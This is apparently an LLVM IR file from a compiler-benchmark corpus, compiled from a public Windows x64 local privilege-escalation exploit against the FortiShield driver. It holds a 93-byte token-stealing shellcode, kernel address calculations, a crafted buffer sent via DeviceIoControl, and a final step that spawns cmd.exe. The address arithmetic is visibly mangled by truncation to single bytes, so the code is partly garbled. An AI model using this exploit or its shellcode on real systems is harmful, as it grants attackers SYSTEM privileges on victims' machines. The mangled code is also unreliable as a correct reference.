; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41721.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41721.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [16 x i8] c"\\\\.\\FortiShield\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [53 x i8] c"[!] Error while creating a handle to the driver: %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"hal.dll\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"FortiShield.sys\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"[+] HAL.dll found at: %llx\0A\00", align 1
@.str.5 = private unnamed_addr constant [36 x i8] c"[+] FortiShield.sys found at: %llx\0A\00", align 1
@.str.6 = private unnamed_addr constant [34 x i8] c"[+] PTE virtual address at: %llx\0A\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@MEM_RESERVE = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [42 x i8] c"[!] Error while allocating shellcode: %d\0A\00", align 1
@__const.main.token_steal = private unnamed_addr constant [93 x i8] c"eH\8B\14%\88\01\00\00L\8B\82\B8\00\00\00M\8B\88\F0\02\00\00I\8B\09H\8BQ\F8H\83\FA\04t\08H\8B\09L9\C9u\EEH\8BAh$\F0I\89\80X\03\00\00H\8B\AC$\80\00\00\00H1\DBH\89]\00H\8B\AC$\88\00\00\00H\89\F0H\89\C4H\83\EC \FF\E5\00", align 16
@.str.8 = private unnamed_addr constant [48 x i8] c"[!] Error while calling WriteProcessMemory: %d\0A\00", align 1
@trigger_callback = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [42 x i8] c"[!] Error while calling CreateThread: %d\0A\00", align 1
@THREAD_PRIORITY_HIGHEST = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [47 x i8] c"[!] Error while calling SetThreadPriority: %d\0A\00", align 1
@INFINITE = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [14 x i8] c"start cmd.exe\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca i8, align 1
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i8, align 1
  %17 = alloca i32*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca [93 x i8], align 16
  %30 = alloca i64, align 8
  %31 = alloca i32, align 4
  %32 = alloca i64, align 8
  %33 = alloca i32, align 4
  %34 = alloca i64, align 8
  %35 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %36 = load i32, i32* @GENERIC_READ, align 4
  %37 = load i32, i32* @GENERIC_WRITE, align 4
  %38 = or i32 %36, %37
  %39 = load i32, i32* @OPEN_EXISTING, align 4
  %40 = call i64 @CreateFile(i32 ptrtoint ([16 x i8]* @.str to i32), i32 %38, i32 0, i32* null, i32 %39, i32 0, i32* null)
  store i64 %40, i64* %2, align 8
  %41 = load i64, i64* %2, align 8
  %42 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %43 = icmp eq i64 %41, %42
  br i1 %43, label %44, label %47

44:                                               ; preds = %0
  %45 = call i32 (...) @GetLastError()
  %46 = call i32 @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.1, i64 0, i64 0), i32 %45)
  store i32 1, i32* %1, align 4
  br label %200

47:                                               ; preds = %0
  %48 = call i32* @GetBaseAddr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  store i32* %48, i32** %3, align 8
  %49 = call i32* @GetBaseAddr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  store i32* %49, i32** %4, align 8
  %50 = call signext i8 @get_pxe_address_64(i32 1207959552)
  store i8 %50, i8* %5, align 1
  %51 = load i32*, i32** %3, align 8
  %52 = ptrtoint i32* %51 to i8
  %53 = sext i8 %52 to i32
  %54 = add nsw i32 %53, 27632
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %6, align 1
  %56 = load i32*, i32** %4, align 8
  %57 = ptrtoint i32* %56 to i8
  %58 = sext i8 %57 to i32
  %59 = add nsw i32 %58, 53584
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %7, align 1
  %61 = load i32*, i32** %4, align 8
  %62 = ptrtoint i32* %61 to i8
  %63 = sext i8 %62 to i32
  %64 = add nsw i32 %63, 12147
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %8, align 1
  %66 = load i32*, i32** %3, align 8
  %67 = ptrtoint i32* %66 to i8
  %68 = sext i8 %67 to i32
  %69 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i32 %68)
  %70 = load i32*, i32** %4, align 8
  %71 = ptrtoint i32* %70 to i8
  %72 = sext i8 %71 to i32
  %73 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.5, i64 0, i64 0), i32 %72)
  %74 = load i8, i8* %5, align 1
  %75 = sext i8 %74 to i32
  %76 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0), i32 %75)
  store i32 2228264, i32* %9, align 4
  %77 = load i8, i8* %6, align 1
  store i8 %77, i8* %10, align 1
  store i32 8, i32* %11, align 4
  store i8 0, i8* %12, align 1
  store i32 0, i32* %13, align 4
  %78 = call i64 (...) @GetCurrentProcess()
  store i64 %78, i64* %15, align 8
  store i8 111, i8* %16, align 1
  %79 = load i8, i8* %16, align 1
  %80 = sext i8 %79 to i64
  %81 = inttoptr i64 %80 to i32**
  %82 = load i32, i32* @MEM_COMMIT, align 4
  %83 = load i32, i32* @MEM_RESERVE, align 4
  %84 = or i32 %82, %83
  %85 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %86 = call i32* @VirtualAlloc(i32** %81, i32 73728, i32 %84, i32 %85)
  store i32* %86, i32** %17, align 8
  %87 = load i32*, i32** %17, align 8
  %88 = icmp eq i32* %87, null
  br i1 %88, label %89, label %92

89:                                               ; preds = %47
  %90 = call i32 (...) @GetLastError()
  %91 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.7, i64 0, i64 0), i32 %90)
  store i32 1, i32* %1, align 4
  br label %200

92:                                               ; preds = %47
  store i32 73728, i32* %19, align 4
  %93 = load i32*, i32** %3, align 8
  %94 = ptrtoint i32* %93 to i8
  %95 = sext i8 %94 to i32
  %96 = add nsw i32 %95, 26254
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %20, align 1
  store i8 99, i8* %21, align 1
  %98 = load i32*, i32** %3, align 8
  %99 = ptrtoint i32* %98 to i8
  %100 = sext i8 %99 to i32
  %101 = add nsw i32 %100, 39038
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %22, align 1
  %103 = load i8, i8* %5, align 1
  store i8 %103, i8* %23, align 1
  %104 = load i32*, i32** %3, align 8
  %105 = ptrtoint i32* %104 to i8
  %106 = sext i8 %105 to i32
  %107 = add nsw i32 %106, 58060
  %108 = trunc i32 %107 to i8
  store i8 %108, i8* %24, align 1
  %109 = load i32*, i32** %3, align 8
  %110 = ptrtoint i32* %109 to i8
  %111 = sext i8 %110 to i32
  %112 = add nsw i32 %111, 88656
  %113 = trunc i32 %112 to i8
  store i8 %113, i8* %25, align 1
  %114 = load i8, i8* %16, align 1
  %115 = sext i8 %114 to i32
  %116 = add nsw i32 %115, 65600
  %117 = trunc i32 %116 to i8
  store i8 %117, i8* %26, align 1
  %118 = load i8, i8* %7, align 1
  store i8 %118, i8* %27, align 1
  %119 = load i8, i8* %8, align 1
  store i8 %119, i8* %28, align 1
  %120 = bitcast [93 x i8]* %29 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %120, i8* align 16 getelementptr inbounds ([93 x i8], [93 x i8]* @__const.main.token_steal, i32 0, i32 0), i64 93, i1 false)
  %121 = load i32, i32* %19, align 4
  %122 = call i64 @malloc(i32 %121)
  %123 = inttoptr i64 %122 to i8*
  store i8* %123, i8** %18, align 8
  %124 = load i8*, i8** %18, align 8
  %125 = load i32, i32* %19, align 4
  %126 = call i32 @memset(i8* %124, i32 65, i32 %125)
  %127 = load i8*, i8** %18, align 8
  %128 = getelementptr inbounds i8, i8* %127, i64 65544
  %129 = call i32 @memcpy(i8* %128, i8* %20, i32 8)
  %130 = load i8*, i8** %18, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 65552
  %132 = call i32 @memcpy(i8* %131, i8* %21, i32 8)
  %133 = load i8*, i8** %18, align 8
  %134 = getelementptr inbounds i8, i8* %133, i64 65560
  %135 = call i32 @memcpy(i8* %134, i8* %22, i32 8)
  %136 = load i8*, i8** %18, align 8
  %137 = getelementptr inbounds i8, i8* %136, i64 65568
  %138 = call i32 @memcpy(i8* %137, i8* %23, i32 8)
  %139 = load i8*, i8** %18, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 65576
  %141 = call i32 @memcpy(i8* %140, i8* %24, i32 8)
  %142 = load i8*, i8** %18, align 8
  %143 = getelementptr inbounds i8, i8* %142, i64 65584
  %144 = call i32 @memcpy(i8* %143, i8* %25, i32 8)
  %145 = load i8*, i8** %18, align 8
  %146 = getelementptr inbounds i8, i8* %145, i64 65592
  %147 = call i32 @memcpy(i8* %146, i8* %26, i32 8)
  %148 = load i8*, i8** %18, align 8
  %149 = getelementptr inbounds i8, i8* %148, i64 65600
  %150 = getelementptr inbounds [93 x i8], [93 x i8]* %29, i64 0, i64 0
  %151 = call i32 @memcpy(i8* %149, i8* %150, i32 93)
  %152 = load i8*, i8** %18, align 8
  %153 = getelementptr inbounds i8, i8* %152, i64 65728
  %154 = call i32 @memcpy(i8* %153, i8* %27, i32 8)
  %155 = load i8*, i8** %18, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 65736
  %157 = call i32 @memcpy(i8* %156, i8* %28, i32 8)
  %158 = load i64, i64* %15, align 8
  %159 = load i8, i8* %16, align 1
  %160 = sext i8 %159 to i64
  %161 = inttoptr i64 %160 to i32*
  %162 = load i8*, i8** %18, align 8
  %163 = load i32, i32* %19, align 4
  %164 = call i64 @WriteProcessMemory(i64 %158, i32* %161, i8* %162, i32 %163, i32* %31)
  store i64 %164, i64* %30, align 8
  %165 = load i64, i64* %30, align 8
  %166 = icmp eq i64 %165, 0
  br i1 %166, label %167, label %170

167:                                              ; preds = %92
  %168 = call i32 (...) @GetLastError()
  %169 = call i32 @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.8, i64 0, i64 0), i32 %168)
  store i32 1, i32* %1, align 4
  br label %200

170:                                              ; preds = %92
  store i32 0, i32* %33, align 4
  %171 = load i32, i32* %33, align 4
  %172 = call i64 @CreateThread(i32* null, i32 0, i32 ptrtoint (i32* @trigger_callback to i32), i32* null, i32 0, i32 %171)
  store i64 %172, i64* %32, align 8
  %173 = load i64, i64* %32, align 8
  %174 = inttoptr i64 %173 to i8*
  %175 = icmp eq i8* %174, null
  br i1 %175, label %176, label %179

176:                                              ; preds = %170
  %177 = call i32 (...) @GetLastError()
  %178 = call i32 @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.9, i64 0, i64 0), i32 %177)
  store i32 1, i32* %1, align 4
  br label %200

179:                                              ; preds = %170
  %180 = load i64, i64* %32, align 8
  %181 = load i32, i32* @THREAD_PRIORITY_HIGHEST, align 4
  %182 = call i64 @SetThreadPriority(i64 %180, i32 %181)
  store i64 %182, i64* %34, align 8
  %183 = load i64, i64* %34, align 8
  %184 = icmp eq i64 %183, 0
  br i1 %184, label %185, label %188

185:                                              ; preds = %179
  %186 = call i32 (...) @GetLastError()
  %187 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.10, i64 0, i64 0), i32 %186)
  store i32 1, i32* %1, align 4
  br label %200

188:                                              ; preds = %179
  %189 = load i64, i64* %2, align 8
  %190 = load i32, i32* %9, align 4
  %191 = bitcast i8* %10 to i32*
  %192 = load i32, i32* %11, align 4
  %193 = bitcast i8* %12 to i32*
  %194 = load i32, i32* %13, align 4
  %195 = call i64 @DeviceIoControl(i64 %189, i32 %190, i32* %191, i32 %192, i32* %193, i32 %194, i32* %14, i32* null)
  store i64 %195, i64* %35, align 8
  %196 = load i64, i64* %32, align 8
  %197 = load i32, i32* @INFINITE, align 4
  %198 = call i32 @WaitForSingleObject(i64 %196, i32 %197)
  %199 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %200

200:                                              ; preds = %188, %185, %176, %167, %89, %44
  %201 = load i32, i32* %1, align 4
  ret i32 %201
}

declare dso_local i64 @CreateFile(i32, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32* @GetBaseAddr(i8*) #1

declare dso_local signext i8 @get_pxe_address_64(i32) #1

declare dso_local i64 @GetCurrentProcess(...) #1

declare dso_local i32* @VirtualAlloc(i32**, i32, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i64 @WriteProcessMemory(i64, i32*, i8*, i32, i32*) #1

declare dso_local i64 @CreateThread(i32*, i32, i32, i32*, i32, i32) #1

declare dso_local i64 @SetThreadPriority(i64, i32) #1

declare dso_local i64 @DeviceIoControl(i64, i32, i32*, i32, i32*, i32, i32*, i32*) #1

declare dso_local i32 @WaitForSingleObject(i64, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
